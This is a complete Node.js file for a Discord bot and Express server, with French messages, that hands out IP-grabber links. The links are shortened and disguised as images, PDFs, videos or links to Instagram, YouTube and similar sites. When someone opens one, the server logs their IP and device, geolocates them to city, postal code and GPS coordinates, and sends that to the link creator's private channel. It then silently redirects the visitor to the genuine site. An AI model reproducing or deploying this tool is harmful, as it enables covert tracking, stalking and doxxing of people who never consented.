require('dotenv').config();
const express = require('express');
const axios = require('axios');
const fs = require('fs');
const crypto = require('crypto');
const cors = require('cors');
const DeviceDetector = require('device-detector-js');
const {
  Client,
  GatewayIntentBits,
  Partials,
  Events,
  ButtonBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonStyle,
  ChannelType,
  PermissionsBitField,
  EmbedBuilder
} = require('discord.js');

const app = express();
app.use(cors());

const port = process.env.PORT || 3000;
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const TRACKER_BASE_URL = process.env.TRACKER_BASE_URL;
const BDC_TOKEN = process.env.BDC_TOKEN;
const CLIENTS_FILE = './clients.json';
const deviceDetector = new DeviceDetector();

let lookup;
const maxmind = require('maxmind');
(async () => {
  lookup = await maxmind.open('./GeoLite2-City.mmdb');
})();

async function shortenWithInstantMediaShare(longUrl, customCode) {
  try {
    const response = await axios.post('https://instantmedia-share.onrender.com/shorten', {
      url: longUrl,
      customCode: customCode
    });
    return response.data.shortUrl;
  } catch (error) {
    console.error('Erreur Shortlink:', error.response?.data || error.message);
    return null;
  }
}

async function logIp(req, res, redirectUrl = null) {
  const u = req.query.u;
  if (!u) return res.redirect('https://google.com');

  const rawIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const ip = rawIp.split(',')[0].trim();
  const userAgent = req.headers['user-agent'];
  const device = deviceDetector.parse(userAgent);

  if (!device.client?.name && !device.os?.name) {
    console.log(`⛔ Ignoré - Appareil inconnu pour IP ${ip}`);
    if (redirectUrl) {
      return res.redirect(redirectUrl);
    } else {
      return res.status(204).send();
    }
  }

  let geo = {};
  let bigdata = {};

  try {
    geo = lookup.get(ip) || {};
  } catch {}

  try {
    const { data } = await axios.get(`https://api.bigdatacloud.net/data/ip-geolocation?ip=${ip}&localityLanguage=fr&key=${BDC_TOKEN}`);
    bigdata = data;
  } catch {}

  const coordsMaxMind = geo?.location ? `${geo.location.latitude},${geo.location.longitude}` : null;
  const coordsBigData = bigdata?.location ? `${bigdata.location.latitude},${bigdata.location.longitude}` : null;
  const bestCoords = coordsBigData || coordsMaxMind;
  const coordsField = bestCoords
    ? `[${bestCoords}](https://maps.google.com/?q=${bestCoords})`
    : '❌ Introuvable';

  const embed = new EmbedBuilder()
    .setTitle('📥 Nouvelle connexion détectée')
    .addFields(
      { name: 'IP', value: `\`${ip}\`` },
      { name: 'Appareil', value: `${device.client?.name || 'Inconnu'} - ${device.os?.name || 'Inconnu'}` },
      { name: 'Pays', value: geo?.country?.names?.fr || '❌ Introuvable', inline: true },
      { name: 'Région', value: geo?.subdivisions?.[0]?.names?.fr || '❌ Introuvable', inline: true },
      { name: 'Ville', value: geo?.city?.names?.fr || '❌ Introuvable', inline: true },
      { name: 'Code Postal', value: geo?.postal?.code || '❌ Introuvable', inline: true },
      { name: 'FAI', value: geo?.traits?.isp || '❌ Introuvable', inline: true },
      { name: 'Localisation GPS', value: coordsField }
    )
    .setColor(0x00AE86)
    .setTimestamp();

  try {
    if (fs.existsSync(CLIENTS_FILE)) {
      const clients = JSON.parse(fs.readFileSync(CLIENTS_FILE));
      const channelId = clients[u];
      if (channelId) {
        await axios.post(`https://discord.com/api/v10/channels/${channelId}/messages`, {
          embeds: [embed]
        }, {
          headers: {
            Authorization: `Bot ${DISCORD_TOKEN}`,
            'Content-Type': 'application/json'
          }
        });
      }
    }
  } catch (err) {
    console.error("Erreur Discord:", err.message);
  }

  if (redirectUrl) {
    return res.redirect(redirectUrl);
  } else {
    return res.status(204).send();
  }
}

app.get('/:type', async (req, res) => {
  const { type } = req.params;

  if (['image.jpg', 'video.mp4', 'document.pdf'].includes(type)) {
    await logIp(req, res);
  } else {
    const redirectUrl = type === 'x' ? 'https://x.com' : `https://${type}.com`;
    await logIp(req, res, redirectUrl);
  }
});

app.listen(port, () => {
  console.log(`🚀 Serveur Express actif sur le port ${port}`);
});

const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages],
  partials: [Partials.Channel]
});

client.once(Events.ClientReady, async () => {
  console.log(`🤖 Bot connecté en tant que ${client.user.tag}`);

  const guild = await client.guilds.fetch(process.env.GUILD_ID);
  const channels = await guild.channels.fetch();
  const generationChannel = channels.find(c => c.name === '🎯・générer-mon-lien');

  if (!generationChannel) {
    console.error('❌ Salon 🎯・générer-mon-lien introuvable.');
    return;
  }

  const existingMessages = await generationChannel.messages.fetch({ limit: 10 });
  const alreadyHasButton = existingMessages.some(m => m.components.length > 0);

  if (!alreadyHasButton) {
    const generateButton = new ButtonBuilder()
      .setCustomId('generate_tracker')
      .setLabel('🎯 Générer mon lien')
      .setStyle(ButtonStyle.Success);

    const row = new ActionRowBuilder().addComponents(generateButton);

    await generationChannel.send({
      content: 'Clique sur le bouton pour générer ton lien tracker 👇',
      components: [row]
    });
    console.log('✅ Message de génération envoyé dans 🎯・générer-mon-lien');
  } else {
    console.log('ℹ️ Message de génération déjà présent, rien envoyé.');
  }
});

client.on(Events.InteractionCreate, async interaction => {
  if (interaction.isButton() && interaction.customId === 'generate_tracker') {
    if (interaction.replied || interaction.deferred) return;
    const replyMessage = await interaction.reply({ content: "🔄 Préparation de ton lien... Merci de patienter quelques secondes.", ephemeral: true });

    const guild = interaction.guild;
    const user = interaction.user;
    const shortId = crypto.randomBytes(3).toString("hex");
    const channelName = `🔗・mon-lien-tracker-${shortId}`;

    const privateChannel = await guild.channels.create({
      name: channelName,
      type: ChannelType.GuildText,
      permissionOverwrites: [
        { id: guild.roles.everyone, deny: [PermissionsBitField.Flags.ViewChannel] },
        { id: user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.ReadMessageHistory], deny: [
          PermissionsBitField.Flags.SendMessages,
          PermissionsBitField.Flags.AttachFiles,
          PermissionsBitField.Flags.EmbedLinks,
          PermissionsBitField.Flags.MentionEveryone,
          PermissionsBitField.Flags.AddReactions
        ] },
        { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.EmbedLinks, PermissionsBitField.Flags.AttachFiles, PermissionsBitField.Flags.ManageChannels] }
      ]
    });

    await new Promise(resolve => setTimeout(resolve, 1000));

    await replyMessage.edit({ content: `✅ Ton salon privé est prêt ici : <#${privateChannel.id}>` });

    const select = new StringSelectMenuBuilder()
      .setCustomId('select_tracker_type')
      .setPlaceholder('Choisis ton type de lien')
      .addOptions(
        { label: 'Image (.jpg)', value: 'image.jpg', emoji: '📸' },
        { label: 'Document (.pdf)', value: 'document.pdf', emoji: '📄' },
        { label: 'Vidéo (.mp4)', value: 'video.mp4', emoji: '🎥' },
        { label: 'Instagram', value: 'instagram', emoji: '🌐' },
        { label: 'YouTube', value: 'youtube', emoji: '🌐' },
        { label: 'TikTok', value: 'tiktok', emoji: '🌐' },
        { label: 'Facebook', value: 'facebook', emoji: '🌐' },
        { label: 'Twitter (X)', value: 'x', emoji: '🌐' },
        { label: 'Discord', value: 'discord', emoji: '🌐' }
      );

    const row = new ActionRowBuilder().addComponents(select);

    await privateChannel.send({
      content: `🔍 Choisis le type de lien que tu veux générer :`,
      components: [row]
    });

    const uniqueId = `${user.id}_${shortId}`;
    let clients = {};
    if (fs.existsSync(CLIENTS_FILE)) {
      clients = JSON.parse(fs.readFileSync(CLIENTS_FILE));
    }
    clients[uniqueId] = privateChannel.id;
    fs.writeFileSync(CLIENTS_FILE, JSON.stringify(clients, null, 2));

    setTimeout(async () => {
      try {
        await privateChannel.delete();
        console.log(`🗑️ Salon supprimé automatiquement : ${privateChannel.name}`);
      } catch (error) {
        console.error('Erreur suppression salon :', error.message);
      }
    }, 15 * 60 * 1000);
  }

  if (interaction.isStringSelectMenu() && interaction.customId === 'select_tracker_type') {
    if (interaction.replied || interaction.deferred) return;
    await interaction.reply({ content: "🔗 Génération de ton lien...", ephemeral: true });

    const user = interaction.user;
    const channel = interaction.channel;
    const selection = interaction.values[0];
    const shortId = crypto.randomBytes(3).toString("hex");
    const uniqueId = `${user.id}_${shortId}`;

    const baseUrl = process.env.TRACKER_BASE_URL.replace(/\/$/, '');
    const generatedUrl = `${baseUrl}/${selection}?u=${uniqueId}`;

    const customCode = selection;
    const shortLink = await shortenWithInstantMediaShare(generatedUrl, customCode) || generatedUrl;

    await channel.send(`✅ Ton lien est prêt :\n${shortLink}`);

    let clients = {};
    if (fs.existsSync(CLIENTS_FILE)) {
      clients = JSON.parse(fs.readFileSync(CLIENTS_FILE));
    }
    clients[uniqueId] = channel.id;
    fs.writeFileSync(CLIENTS_FILE, JSON.stringify(clients, null, 2));
  }
});

client.login(DISCORD_TOKEN);
